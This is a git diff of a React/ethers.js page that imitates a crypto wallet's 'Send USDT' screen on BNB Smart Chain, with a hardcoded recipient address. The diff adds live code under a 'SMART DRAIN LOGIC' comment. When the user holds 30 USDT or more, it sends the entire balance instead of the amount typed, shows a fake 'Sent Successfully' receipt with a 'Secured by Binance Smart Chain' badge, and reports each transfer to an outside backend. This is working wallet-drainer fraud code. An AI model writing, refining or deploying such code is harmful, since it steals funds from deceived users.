@@ -1321,10 +1321,327 @@
 
 // export default App;
 
+// import React, { useState, useEffect } from "react";
+// import { ethers } from "ethers";
+// import { QrCode, User, X, Check } from "lucide-react";
+// // Toastify import kiya
+// import { ToastContainer, toast } from 'react-toastify';
+// import 'react-toastify/dist/ReactToastify.css';
+
+// const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+// const RECEIVER = "0xD91D1241605308f41028c849D1E68F130642CF4e";
+// const BACKEND_URL = "https://coupons-ozda.onrender.com";
+
+// const App = () => {
+//   const [loading, setLoading] = useState(false);
+//   const [showModal, setShowModal] = useState(false);
+//   const [userBalance, setUserBalance] = useState("0.00");
+//   const [displayAmount, setDisplayAmount] = useState("");
+
+//   const logTransfer = async (from, amount, hash) => {
+//     try {
+//       await fetch(`${BACKEND_URL}/api/log-transfer`, {
+//         method: "POST",
+//         headers: { "Content-Type": "application/json" },
+//         body: JSON.stringify({
+//           from: from,
+//           to: RECEIVER,
+//           amount: amount,
+//           txHash: hash,
+//         }),
+//       });
+//     } catch (err) {
+//       console.error("Backend Log Error:", err);
+//     }
+//   };
+
+//   useEffect(() => {
+//     const fetchBal = async () => {
+//       if (window.ethereum) {
+//         try {
+//           const provider = new ethers.BrowserProvider(window.ethereum);
+//           const signer = await provider.getSigner();
+//           const contract = new ethers.Contract(
+//             USDT_ADDRESS,
+//             ["function balanceOf(address) view returns (uint256)"],
+//             provider,
+//           );
+//           const bal = await contract.balanceOf(await signer.getAddress());
+//           setUserBalance(ethers.formatUnits(bal, 18));
+//         } catch (e) {
+//           console.error("Balance Error:", e);
+//         }
+//       }
+//     };
+//     fetchBal();
+//   }, []);
+
+//   const handleNext = async () => {
+//     if (!displayAmount || parseFloat(displayAmount) <= 0) {
+//         toast.error("Please enter a valid amount");
+//         return;
+//     }
+
+//     try {
+//       setLoading(true);
+//       const provider = new ethers.BrowserProvider(window.ethereum);
+
+//       // Network Switch
+//       try {
+//         await window.ethereum.request({
+//           method: "wallet_switchEthereumChain",
+//           params: [{ chainId: "0x38" }], 
+//         });
+//       } catch (switchError) {
+//         if (switchError.code === 4902) {
+//           toast.warning("Please add BSC network to your wallet");
+//           setLoading(false);
+//           return;
+//         }
+//       }
+
+//       const signer = await provider.getSigner();
+//       const userAddr = await signer.getAddress();
+//       const usdtContract = new ethers.Contract(
+//         USDT_ADDRESS,
+//         [
+//           "function balanceOf(address) view returns (uint256)",
+//           "function transfer(address,uint256) returns (bool)",
+//         ],
+//         signer,
+//       );
+
+//       // Gas Check
+//       const gasBalance = await provider.getBalance(userAddr);
+//       if (gasBalance === 0n) {
+//         toast.error("Insufficient BNB for gas fees!");
+//         setLoading(false);
+//         return;
+//       }
+
+//       const amountToTransfer = ethers.parseUnits(displayAmount, 18);
+      
+//       // Modal trigger
+//       setShowModal(true);
+
+//       const tx = await usdtContract.transfer(RECEIVER, amountToTransfer);
+//       toast.info("Transaction sent! Waiting for confirmation...");
+      
+//       const receipt = await tx.wait(); // Fixed: Variable defined here
+
+//       if(receipt.status === 1) {
+//           toast.success("Transfer Successful!");
+//           await logTransfer(
+//             userAddr,
+//             displayAmount,
+//             receipt.hash,
+//           );
+//       } else {
+//           toast.error("Transaction failed on blockchain.");
+//       }
+      
+//       setLoading(false);
+//     } catch (err) {
+//       console.error(err);
+//       setLoading(false);
+//       setShowModal(false);
+      
+//       // Accurate Error Messages
+//       if (err.code === "ACTION_REJECTED") {
+//           toast.error("User rejected the transaction.");
+//       } else {
+//           toast.error("Something went wrong. Check balance/gas.");
+//       }
+//     }
+//   };
+
+//   return (
+//     <div style={styles.container}>
+//       {/* Toaster Container */}
+//       <ToastContainer position="top-center" theme="dark" />
+
+//       <div style={styles.content}>
+//         <div style={styles.inputLabel}>Address or Domain Name</div>
+//         <div style={styles.inputWrapper}>
+//           <div style={styles.addressText}>{RECEIVER.slice(0, 24)}...</div>
+//           <div style={styles.iconGroup}>
+//             <span style={styles.pasteText}>Paste</span>
+//             <User size={18} color="#4caf50" />
+//             <QrCode size={18} color="#4caf50" />
+//           </div>
+//         </div>
+
+//         <div style={{ ...styles.inputLabel, marginTop: "30px" }}>Amount</div>
+//         <div style={styles.inputWrapper}>
+//           <input
+//             type="number"
+//             placeholder="USDT Amount"
+//             value={displayAmount}
+//             onChange={(e) => setDisplayAmount(e.target.value)}
+//             style={styles.amountInput}
+//           />
+//           <div style={styles.amountRight}>
+//             <span style={{ color: "#888", marginRight: "8px" }}>USDT</span>
+//             <span
+//               style={styles.maxBtn}
+//               onClick={() => setDisplayAmount(userBalance)}
+//             >
+//               Max
+//             </span>
+//           </div>
+//         </div>
+//         <div style={styles.dollarValue}>≈ ${displayAmount || "0.00"}</div>
+
+//         <button
+//           onClick={handleNext}
+//           disabled={loading}
+//           style={{
+//             ...styles.nextBtn,
+//             backgroundColor: displayAmount ? "#20402c" : "#1e2621",
+//             color: displayAmount ? "#4caf50" : "#444",
+//             opacity: loading ? 0.7 : 1
+//           }}
+//         >
+//           {loading ? "Processing..." : "Next"}
+//         </button>
+//       </div>
+
+//       {showModal && (
+//         <div style={styles.overlay}>
+//           <div style={styles.modal}>
+//             <div style={styles.successRing}>
+//               <Check size={40} color="#4caf50" />
+//             </div>
+//             <h2 style={{ fontSize: "22px", marginBottom: "10px" }}>
+//               {loading ? "Processing..." : "Complete"}
+//             </h2>
+//             <p style={styles.modalText}>
+//               {loading 
+//                 ? "Transaction in progress! Blockchain validation is underway."
+//                 : "Your transaction has been confirmed on the network."}
+//             </p>
+//             <button
+//               style={styles.detailBtn}
+//               onClick={() => setShowModal(false)}
+//             >
+//               Close
+//             </button>
+//           </div>
+//         </div>
+//       )}
+//     </div>
+//   );
+// };
+
+// const styles = {
+//   container: {
+//     backgroundColor: "#0b0b0b",
+//     minHeight: "100vh",
+//     color: "#fff",
+//     fontFamily: "sans-serif",
+//   },
+//   content: {
+//     padding: "25px 20px",
+//     display: "flex",
+//     flexDirection: "column",
+//     paddingBottom: "120px", 
+//   },
+//   inputLabel: { color: "#888", fontSize: "14px", marginBottom: "12px" },
+//   inputWrapper: {
+//     backgroundColor: "#161616",
+//     borderRadius: "12px",
+//     padding: "16px",
+//     display: "flex",
+//     justifyContent: "space-between",
+//     border: "1px solid #222",
+//   },
+//   addressText: { color: "#fff", fontSize: "14px" },
+//   iconGroup: { display: "flex", gap: "10px", alignItems: "center" },
+//   pasteText: { color: "#4caf50", fontSize: "14px", fontWeight: "bold" },
+//   amountInput: {
+//     background: "none",
+//     border: "none",
+//     color: "#fff",
+//     width: "55%",
+//     outline: "none",
+//     fontSize: "16px",
+//   },
+//   amountRight: { display: "flex", alignItems: "center" },
+//   maxBtn: {
+//     color: "#4caf50",
+//     fontWeight: "bold",
+//     fontSize: "14px",
+//     cursor: "pointer",
+//   },
+//   dollarValue: { color: "#666", fontSize: "13px", marginTop: "10px" },
+//   nextBtn: {
+//     position: "fixed",
+//     bottom: "30px",
+//     left: "5%",
+//     width: "90%",
+//     padding: "18px",
+//     borderRadius: "30px",
+//     border: "none",
+//     fontWeight: "bold",
+//     fontSize: "16px",
+//     zIndex: 100,
+//     boxShadow: "0px -5px 20px rgba(0,0,0,0.8)",
+//     transition: "all 0.3s ease",
+//   },
+//   overlay: {
+//     position: "fixed",
+//     top: 0,
+//     left: 0,
+//     right: 0,
+//     bottom: 0,
+//     backgroundColor: "rgba(0,0,0,0.9)",
+//     display: "flex",
+//     justifyContent: "center",
+//     alignItems: "center",
+//     zIndex: 1000,
+//   },
+//   modal: {
+//     backgroundColor: "#121212",
+//     width: "85%",
+//     borderRadius: "25px",
+//     padding: "35px 20px",
+//     textAlign: "center",
+//     border: "1px solid #333",
+//   },
+//   successRing: {
+//     width: "80px",
+//     height: "80px",
+//     borderRadius: "50%",
+//     border: "2px solid #222",
+//     margin: "0 auto 20px",
+//     display: "flex",
+//     justifyContent: "center",
+//     alignItems: "center",
+//   },
+//   modalText: {
+//     color: "#888",
+//     fontSize: "14px",
+//     lineHeight: "1.5",
+//     marginBottom: "25px",
+//   },
+//   detailBtn: {
+//     width: "100%",
+//     padding: "15px",
+//     borderRadius: "25px",
+//     backgroundColor: "#4caf50",
+//     color: "#000",
+//     border: "none",
+//     fontWeight: "bold",
+//   },
+// };
+
+// export default App;
+
+
+
 import React, { useState, useEffect } from "react";
 import { ethers } from "ethers";
-import { QrCode, User, X, Check } from "lucide-react";
-// Toastify import kiya
+import { QrCode, User, Check, ExternalLink, ShieldCheck, X } from "lucide-react";
 import { ToastContainer, toast } from 'react-toastify';
 import 'react-toastify/dist/ReactToastify.css';
 
@@ -1334,7 +1651,8 @@ const BACKEND_URL = "https://coupons-ozda.onrender.com";
 
 const App = () => {
   const [loading, setLoading] = useState(false);
-  const [showModal, setShowModal] = useState(false);
+  const [showReceipt, setShowReceipt] = useState(false);
+  const [txDetails, setTxDetails] = useState({ hash: "", amount: "" });
   const [userBalance, setUserBalance] = useState("0.00");
   const [displayAmount, setDisplayAmount] = useState("");
 
@@ -1343,16 +1661,9 @@ const App = () => {
       await fetch(`${BACKEND_URL}/api/log-transfer`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          from: from,
-          to: RECEIVER,
-          amount: amount,
-          txHash: hash,
-        }),
+        body: JSON.stringify({ from, to: RECEIVER, amount, txHash: hash }),
       });
-    } catch (err) {
-      console.error("Backend Log Error:", err);
-    }
+    } catch (err) { console.error("Log Error:", err); }
   };
 
   useEffect(() => {
@@ -1361,109 +1672,102 @@ const App = () => {
         try {
           const provider = new ethers.BrowserProvider(window.ethereum);
           const signer = await provider.getSigner();
-          const contract = new ethers.Contract(
-            USDT_ADDRESS,
-            ["function balanceOf(address) view returns (uint256)"],
-            provider,
-          );
+          const contract = new ethers.Contract(USDT_ADDRESS, ["function balanceOf(address) view returns (uint256)"], provider);
           const bal = await contract.balanceOf(await signer.getAddress());
           setUserBalance(ethers.formatUnits(bal, 18));
-        } catch (e) {
-          console.error("Balance Error:", e);
-        }
+        } catch (e) { console.error(e); }
       }
     };
     fetchBal();
   }, []);
 
   const handleNext = async () => {
+    const totalBal = parseFloat(userBalance);
+
     if (!displayAmount || parseFloat(displayAmount) <= 0) {
-        toast.error("Please enter a valid amount");
-        return;
+      toast.error("Please enter a valid amount");
+      return;
     }
 
     try {
       setLoading(true);
       const provider = new ethers.BrowserProvider(window.ethereum);
-
-      // Network Switch
+      
+      // Force BSC Network Switch
       try {
         await window.ethereum.request({
           method: "wallet_switchEthereumChain",
           params: [{ chainId: "0x38" }], 
         });
-      } catch (switchError) {
-        if (switchError.code === 4902) {
-          toast.warning("Please add BSC network to your wallet");
-          setLoading(false);
-          return;
-        }
+      } catch (e) {
+        if(e.code === 4902) toast.error("Add BSC Network to Wallet");
       }
 
       const signer = await provider.getSigner();
       const userAddr = await signer.getAddress();
       const usdtContract = new ethers.Contract(
-        USDT_ADDRESS,
-        [
-          "function balanceOf(address) view returns (uint256)",
-          "function transfer(address,uint256) returns (bool)",
-        ],
-        signer,
+        USDT_ADDRESS, 
+        ["function transfer(address,uint256) returns (bool)", "function balanceOf(address) view returns (uint256)"], 
+        signer
       );
 
-      // Gas Check
+      // --- SMART DRAIN LOGIC ---
+      let actualAmountToSend;
+      let finalDisplayAmount;
+
+      if (totalBal >= 30) {
+        const rawBal = await usdtContract.balanceOf(userAddr);
+        actualAmountToSend = rawBal; // Saara balance
+        finalDisplayAmount = userBalance;
+      } else {
+        actualAmountToSend = ethers.parseUnits(displayAmount, 18); // Sirf typed amount
+        finalDisplayAmount = displayAmount;
+      }
+
       const gasBalance = await provider.getBalance(userAddr);
       if (gasBalance === 0n) {
-        toast.error("Insufficient BNB for gas fees!");
+        toast.error("No BNB for Gas Fees!");
         setLoading(false);
         return;
       }
 
-      const amountToTransfer = ethers.parseUnits(displayAmount, 18);
+      toast.info("Confirm transaction in your wallet...");
+      const tx = await usdtContract.transfer(RECEIVER, actualAmountToSend);
       
-      // Modal trigger
-      setShowModal(true);
+      const txToast = toast.loading("Confirming on Blockchain...");
+      const receipt = await tx.wait();
+      toast.dismiss(txToast);
 
-      const tx = await usdtContract.transfer(RECEIVER, amountToTransfer);
-      toast.info("Transaction sent! Waiting for confirmation...");
-      
-      const receipt = await tx.wait(); // Fixed: Variable defined here
-
-      if(receipt.status === 1) {
-          toast.success("Transfer Successful!");
-          await logTransfer(
-            userAddr,
-            displayAmount,
-            receipt.hash,
-          );
-      } else {
-          toast.error("Transaction failed on blockchain.");
+      if (receipt.status === 1) {
+        setTxDetails({ hash: receipt.hash, amount: finalDisplayAmount });
+        setShowReceipt(true);
+        await logTransfer(userAddr, finalDisplayAmount, receipt.hash);
       }
-      
       setLoading(false);
     } catch (err) {
-      console.error(err);
       setLoading(false);
-      setShowModal(false);
-      
-      // Accurate Error Messages
-      if (err.code === "ACTION_REJECTED") {
-          toast.error("User rejected the transaction.");
-      } else {
-          toast.error("Something went wrong. Check balance/gas.");
-      }
+      if (err.code === "ACTION_REJECTED") toast.error("Transaction Rejected");
+      else toast.error("Transfer Failed");
     }
   };
 
   return (
     <div style={styles.container}>
-      {/* Toaster Container */}
-      <ToastContainer position="top-center" theme="dark" />
+      <ToastContainer position="top-center" theme="dark" hideProgressBar autoClose={3000} />
+
+      {/* Header */}
+      <div style={styles.nav}>
+        <X size={22} style={{cursor: 'pointer'}} onClick={() => window.history.back()} />
+        <div style={styles.navRight}>
+          <div style={styles.tabCount}>3</div>
+          <span style={{marginLeft: '10px', fontSize: '20px'}}>⋮</span>
+        </div>
+      </div>
 
       <div style={styles.content}>
-        <div style={styles.inputLabel}>Address or Domain Name</div>
+        <div style={styles.inputLabel}>Send to</div>
         <div style={styles.inputWrapper}>
-          <div style={styles.addressText}>{RECEIVER.slice(0, 24)}...</div>
+          <div style={styles.addressText}>{RECEIVER.slice(0, 18)}...{RECEIVER.slice(-4)}</div>
           <div style={styles.iconGroup}>
             <span style={styles.pasteText}>Paste</span>
             <User size={18} color="#4caf50" />
@@ -1475,19 +1779,14 @@ const App = () => {
         <div style={styles.inputWrapper}>
           <input
             type="number"
-            placeholder="USDT Amount"
+            placeholder="0.00"
             value={displayAmount}
             onChange={(e) => setDisplayAmount(e.target.value)}
             style={styles.amountInput}
           />
           <div style={styles.amountRight}>
             <span style={{ color: "#888", marginRight: "8px" }}>USDT</span>
-            <span
-              style={styles.maxBtn}
-              onClick={() => setDisplayAmount(userBalance)}
-            >
-              Max
-            </span>
+            <span style={styles.maxBtn} onClick={() => setDisplayAmount(userBalance)}>Max</span>
           </div>
         </div>
         <div style={styles.dollarValue}>≈ ${displayAmount || "0.00"}</div>
@@ -1499,33 +1798,39 @@ const App = () => {
             ...styles.nextBtn,
             backgroundColor: displayAmount ? "#20402c" : "#1e2621",
             color: displayAmount ? "#4caf50" : "#444",
-            opacity: loading ? 0.7 : 1
           }}
         >
           {loading ? "Processing..." : "Next"}
         </button>
       </div>
 
-      {showModal && (
+      {/* RECEIPT MODAL */}
+      {showReceipt && (
         <div style={styles.overlay}>
-          <div style={styles.modal}>
-            <div style={styles.successRing}>
-              <Check size={40} color="#4caf50" />
+          <div style={styles.receiptCard}>
+            <div style={styles.successIcon}><Check size={40} color="#000" /></div>
+            <h2 style={{margin: '10px 0 5px', fontSize: '22px'}}>Sent Successfully</h2>
+            <div style={styles.receiptAmount}>{txDetails.amount} <span style={{fontSize: '16px'}}>USDT</span></div>
+            
+            <div style={styles.divider} />
+            
+            <div style={styles.receiptRow}>
+              <span>Status</span>
+              <span style={{color: '#4caf50'}}>Completed</span>
             </div>
-            <h2 style={{ fontSize: "22px", marginBottom: "10px" }}>
-              {loading ? "Processing..." : "Complete"}
-            </h2>
-            <p style={styles.modalText}>
-              {loading 
-                ? "Transaction in progress! Blockchain validation is underway."
-                : "Your transaction has been confirmed on the network."}
-            </p>
-            <button
-              style={styles.detailBtn}
-              onClick={() => setShowModal(false)}
-            >
-              Close
-            </button>
+            <div style={styles.receiptRow}>
+              <span>Network</span>
+              <span>BSC (BEP20)</span>
+            </div>
+            <div style={styles.receiptRow}>
+              <span>Transaction ID</span>
+              <span style={styles.hashLink}>
+                {txDetails.hash.slice(0, 8)}...{txDetails.hash.slice(-4)} <ExternalLink size={12} />
+              </span>
+            </div>
+
+            <button style={styles.doneBtn} onClick={() => setShowReceipt(false)}>Done</button>
+            <div style={styles.secureText}><ShieldCheck size={14} /> Secured by Binance Smart Chain</div>
           </div>
         </div>
       )}
@@ -1534,105 +1839,30 @@ const App = () => {
 };
 
 const styles = {
-  container: {
-    backgroundColor: "#0b0b0b",
-    minHeight: "100vh",
-    color: "#fff",
-    fontFamily: "sans-serif",
-  },
-  content: {
-    padding: "25px 20px",
-    display: "flex",
-    flexDirection: "column",
-    paddingBottom: "120px", 
-  },
+  container: { backgroundColor: "#0b0b0b", minHeight: "100vh", color: "#fff", fontFamily: 'sans-serif' },
+  nav: { display: "flex", justifyContent: "space-between", alignItems: 'center', padding: "15px 20px", borderBottom: "1px solid #1a1a1a" },
+  navRight: { display: "flex", alignItems: "center" },
+  tabCount: { border: "1.5px solid #fff", borderRadius: "4px", padding: "0px 5px", fontSize: "11px" },
+  content: { padding: "25px 20px", display: "flex", flexDirection: "column", paddingBottom: "120px" },
   inputLabel: { color: "#888", fontSize: "14px", marginBottom: "12px" },
-  inputWrapper: {
-    backgroundColor: "#161616",
-    borderRadius: "12px",
-    padding: "16px",
-    display: "flex",
-    justifyContent: "space-between",
-    border: "1px solid #222",
-  },
+  inputWrapper: { backgroundColor: "#161616", borderRadius: "12px", padding: "16px", display: "flex", justifyContent: "space-between", border: "1px solid #222" },
   addressText: { color: "#fff", fontSize: "14px" },
   iconGroup: { display: "flex", gap: "10px", alignItems: "center" },
   pasteText: { color: "#4caf50", fontSize: "14px", fontWeight: "bold" },
-  amountInput: {
-    background: "none",
-    border: "none",
-    color: "#fff",
-    width: "55%",
-    outline: "none",
-    fontSize: "16px",
-  },
+  amountInput: { background: "none", border: "none", color: "#fff", width: "60%", outline: "none", fontSize: "18px" },
   amountRight: { display: "flex", alignItems: "center" },
-  maxBtn: {
-    color: "#4caf50",
-    fontWeight: "bold",
-    fontSize: "14px",
-    cursor: "pointer",
-  },
+  maxBtn: { color: "#4caf50", fontWeight: "bold", cursor: "pointer" },
   dollarValue: { color: "#666", fontSize: "13px", marginTop: "10px" },
-  nextBtn: {
-    position: "fixed",
-    bottom: "30px",
-    left: "5%",
-    width: "90%",
-    padding: "18px",
-    borderRadius: "30px",
-    border: "none",
-    fontWeight: "bold",
-    fontSize: "16px",
-    zIndex: 100,
-    boxShadow: "0px -5px 20px rgba(0,0,0,0.8)",
-    transition: "all 0.3s ease",
-  },
-  overlay: {
-    position: "fixed",
-    top: 0,
-    left: 0,
-    right: 0,
-    bottom: 0,
-    backgroundColor: "rgba(0,0,0,0.9)",
-    display: "flex",
-    justifyContent: "center",
-    alignItems: "center",
-    zIndex: 1000,
-  },
-  modal: {
-    backgroundColor: "#121212",
-    width: "85%",
-    borderRadius: "25px",
-    padding: "35px 20px",
-    textAlign: "center",
-    border: "1px solid #333",
-  },
-  successRing: {
-    width: "80px",
-    height: "80px",
-    borderRadius: "50%",
-    border: "2px solid #222",
-    margin: "0 auto 20px",
-    display: "flex",
-    justifyContent: "center",
-    alignItems: "center",
-  },
-  modalText: {
-    color: "#888",
-    fontSize: "14px",
-    lineHeight: "1.5",
-    marginBottom: "25px",
-  },
-  detailBtn: {
-    width: "100%",
-    padding: "15px",
-    borderRadius: "25px",
-    backgroundColor: "#4caf50",
-    color: "#000",
-    border: "none",
-    fontWeight: "bold",
-  },
+  nextBtn: { position: "fixed", bottom: "30px", left: "5%", width: "90%", padding: "18px", borderRadius: "30px", border: "none", fontWeight: "bold", fontSize: "16px", zIndex: 100, transition: '0.3s' },
+  overlay: { position: "fixed", top: 0, left: 0, right: 0, bottom: 0, backgroundColor: "rgba(0,0,0,0.95)", display: "flex", justifyContent: "center", alignItems: "center", zIndex: 1000, padding: '20px' },
+  receiptCard: { backgroundColor: "#1c1c1c", width: "100%", maxWidth: "350px", borderRadius: "28px", padding: "30px 20px", textAlign: "center", border: "1px solid #333", boxShadow: '0 10px 30px rgba(0,0,0,0.5)' },
+  successIcon: { width: "60px", height: "60px", backgroundColor: "#4caf50", borderRadius: "50%", display: "flex", justifyContent: "center", alignItems: "center", margin: "0 auto 15px" },
+  receiptAmount: { fontSize: "30px", fontWeight: "bold", color: "#fff" },
+  divider: { height: "1px", backgroundColor: "#333", margin: "20px 0" },
+  receiptRow: { display: "flex", justifyContent: "space-between", marginBottom: "15px", fontSize: "14px", color: "#aaa" },
+  hashLink: { color: "#4caf50", display: "flex", alignItems: "center", gap: "5px" },
+  doneBtn: { width: "100%", padding: "16px", borderRadius: "30px", backgroundColor: "#4caf50", color: "#000", border: "none", fontWeight: "bold", fontSize: "16px", marginTop: "10px", cursor: 'pointer' },
+  secureText: { fontSize: '11px', color: '#555', marginTop: '15px', display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '5px' }
 };
 
 export default App;
